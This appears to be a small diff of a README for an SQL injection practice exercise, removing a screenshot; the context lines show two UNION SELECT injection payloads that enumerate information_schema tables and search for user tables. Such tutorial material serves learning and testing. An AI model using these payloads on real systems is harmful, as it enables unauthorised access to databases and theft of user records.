@@ -25,7 +25,7 @@ Steps to Implement this program:- ( For Windows users)
 
    1. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables;#
    
-   <img src = "screenshots/Screenshot from 2019-10-03 00-17-35.png"/>
+   
 
    2. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables 
       where table_name like 'user%';#
